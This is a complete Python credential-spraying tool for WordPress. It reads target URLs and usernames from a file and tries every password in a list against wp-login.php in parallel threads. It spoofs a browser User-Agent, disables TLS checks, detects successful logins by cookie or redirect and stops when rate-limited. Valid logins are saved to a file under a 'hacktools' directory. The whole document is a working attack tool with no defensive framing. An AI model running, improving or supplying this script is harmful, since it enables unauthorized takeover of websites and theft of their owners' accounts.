#!/usr/bin/env python3
"""WP wp-login.php credential spray with cookie handling + success detection."""
import sys, time, urllib3, re
import requests
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings()
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/203.0.113.10 Safari/537.36"}

def attempt(base, user, pw, timeout=15):
    s = requests.Session()
    s.verify = False
    s.headers.update(UA)
    try:
        s.get(base + "/wp-login.php", timeout=timeout)
        r = s.post(base + "/wp-login.php", data={
            "log": user, "pwd": pw, "wp-submit": "Log In",
            "redirect_to": base + "/wp-admin/", "testcookie": "1"}, timeout=timeout, allow_redirects=True)
    except Exception as e:
        return None, str(e)[:70]
    body = r.text or ""
    cookies = [c.name for c in s.cookies]
    ok = any(c.startswith("wordpress_logged_in") for c in cookies)
    if not ok and r.url and "/wp-admin/" in r.url and "login" not in r.url:
        ok = True
    err = None
    if "incorrect" in body.lower() or "tidak dikenal" in body.lower() or "salah" in body.lower():
        ok = False
    if "too many" in body.lower() or r.status_code == 429:
        err = "ratelimit"
    return (user, pw, ok, r.status_code, cookies[:3]), err

def main():
    tfile, pfile = sys.argv[1], sys.argv[2]
    workers = int(sys.argv[3]) if len(sys.argv) > 3 else 5
    passes = [l.strip() for l in open(pfile, errors="ignore") if l.strip()]
    for line in open(tfile):
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        url, _, users = line.partition("|")
        base = url.rstrip("/")
        ulist = [u.strip() for u in users.split(",") if u.strip()]
        print(f"[*] {base} users={ulist} pass={len(passes)}")
        hits = []
        def work(pair):
            u, p = pair
            res, err = attempt(base, u, p)
            if err == "ratelimit" or (err and "429" in str(err)):
                return ("ratelimit", u, p)
            if res and res[2]:
                return ("hit", u, p)
            return None
        pairs = [(u, p) for u in ulist for p in passes]
        with ThreadPoolExecutor(max_workers=workers) as ex:
            for i, r in enumerate(ex.map(work, pairs)):
                if not r:
                    continue
                if r[0] == "ratelimit":
                    print(f"[!] {base} rate limited at {r[1]}")
                    break
                if r[0] == "hit":
                    print(f"[+] {base} VALID {r[1]}:{r[2]}")
                    hits.append((r[1], r[2]))
                    with open("$HOME/hacktools/cpanel/wp_full/creds.txt", "a") as f:
                        f.write(f"{base}|{r[1]}|{r[2]}\n")
        if not hits:
            print(f"[-] {base} no hit")

if __name__ == "__main__":
    main()
